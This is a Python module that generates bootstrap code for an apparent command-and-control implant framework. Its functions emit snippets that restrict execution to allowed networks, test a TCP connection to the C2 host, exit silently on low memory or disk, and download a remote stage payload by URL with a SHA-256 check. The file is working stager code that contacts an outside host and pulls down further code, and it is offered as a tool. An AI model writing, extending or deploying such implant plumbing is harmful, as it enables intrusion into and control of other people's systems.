#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Bootstrap snippets for guard-style offline prestage modules."""

from __future__ import annotations

import json
from typing import Iterable, List


def _json_list(values: Iterable[str]) -> str:
    return json.dumps(list(values), separators=(",", ":"))


def build_scope_guard_bootstrap(
    *,
    c2_host: str = "",
    allowed_hosts: List[str] | None = None,
    allowed_cidrs: List[str] | None = None,
) -> str:
    hosts = allowed_hosts or []
    cidrs = allowed_cidrs or ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8"]
    return f"""
import ipaddress as _ip
import socket as _sock
import sys as _sys

_kitty_scope_host = {c2_host!r}
_kitty_scope_allowed_hosts = {_json_list(hosts)}
_kitty_scope_allowed_cidrs = {_json_list(cidrs)}

def _kitty_scope_host_allowed(_host):
    _host = str(_host or "").strip()
    if not _host:
        return False
    if _host in _kitty_scope_allowed_hosts:
        return True
    try:
        _addr = _ip.ip_address(_host)
    except Exception:
        try:
            _addr = _ip.ip_address(_sock.gethostbyname(_host))
        except Exception:
            return False
    for _cidr in _kitty_scope_allowed_cidrs:
        try:
            if _addr in _ip.ip_network(_cidr, strict=False):
                return True
        except Exception:
            continue
    return False

if _kitty_scope_host and not _kitty_scope_host_allowed(_kitty_scope_host):
    try:
        _kitty_telemetry_record("scope_guard", "blocked", _kitty_scope_host)
    except Exception:
        pass
    _sys.exit(0)
""".strip()


def build_network_preflight_bootstrap(*, c2_host: str = "", c2_port: int = 8088, timeout: float = 3.0) -> str:
    return f"""
import socket as _sock
import sys as _sys

_kitty_preflight_host = {c2_host!r}
_kitty_preflight_port = {int(c2_port)}
_kitty_preflight_timeout = {float(timeout)}
_kitty_network_preflight = {{"ok": False, "error": ""}}

if _kitty_preflight_host:
    try:
        _s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        _s.settimeout(_kitty_preflight_timeout)
        _s.connect((_kitty_preflight_host, _kitty_preflight_port))
        _s.close()
        _kitty_network_preflight["ok"] = True
    except Exception as _exc:
        _kitty_network_preflight["error"] = str(_exc)
        try:
            _kitty_telemetry_record("network_preflight", "failed", _kitty_network_preflight["error"])
        except Exception:
            pass
else:
    _kitty_network_preflight["error"] = "missing c2 host"
""".strip()


def build_resource_guard_bootstrap(*, min_mem_mb: int = 32, min_disk_mb: int = 10) -> str:
    return f"""
import os as _os
import shutil as _shutil
import sys as _sys

_kitty_resource_guard = {{"ok": True, "mem_mb": 0, "disk_mb": 0}}
_min_mem = {int(min_mem_mb)}
_min_disk = {int(min_disk_mb)}

try:
    _kitty_resource_guard["disk_mb"] = int(_shutil.disk_usage(_os.getcwd()).free / (1024 * 1024))
except Exception:
    _kitty_resource_guard["disk_mb"] = 0
try:
    if hasattr(_os, "sysconf"):
        _pages = int(_os.sysconf("SC_PHYS_PAGES"))
        _size = int(_os.sysconf("SC_PAGE_SIZE"))
        _kitty_resource_guard["mem_mb"] = int((_pages * _size) / (1024 * 1024))
except Exception:
    pass
if _kitty_resource_guard["mem_mb"] and _kitty_resource_guard["mem_mb"] < _min_mem:
    try:
        _kitty_telemetry_record("resource_guard", "low_memory", str(_kitty_resource_guard["mem_mb"]))
    except Exception:
        pass
    _sys.exit(0)
if _kitty_resource_guard["disk_mb"] and _kitty_resource_guard["disk_mb"] < _min_disk:
    try:
        _kitty_telemetry_record("resource_guard", "low_disk", str(_kitty_resource_guard["disk_mb"]))
    except Exception:
        pass
    _sys.exit(0)
""".strip()


def build_stage_verify_bootstrap(*, stage_url: str = "", stage_sha256: str = "") -> str:
    if not stage_url and not stage_sha256:
        return "pass  # stage_verify: no stage_url/sha256 configured"
    return f"""
import hashlib as _hashlib
import urllib.request as _urlreq

_kitty_stage_verify = {{"ok": True, "error": ""}}
_stage_url = {stage_url!r}
_expected_sha = {stage_sha256!r}.lower()

def _kitty_stage_fetch(_url):
    _cache = globals().get("_kitty_stage_cache")
    if _cache is not None:
        return _cache.fetch(_url, expected_sha256=_expected_sha or "")
    with _urlreq.urlopen(_url, timeout=30) as _resp:
        return _resp.read()

try:
    _data = b""
    if _stage_url:
        _data = _kitty_stage_fetch(_stage_url)
    if _expected_sha:
        _digest = _hashlib.sha256(_data).hexdigest().lower()
        if _digest != _expected_sha:
            raise ValueError("stage sha256 mismatch")
except Exception as _exc:
    _kitty_stage_verify = {{"ok": False, "error": str(_exc)}}
    try:
        _kitty_telemetry_record("stage_verify", "failed", str(_exc))
    except Exception:
        pass
    raise
""".strip()
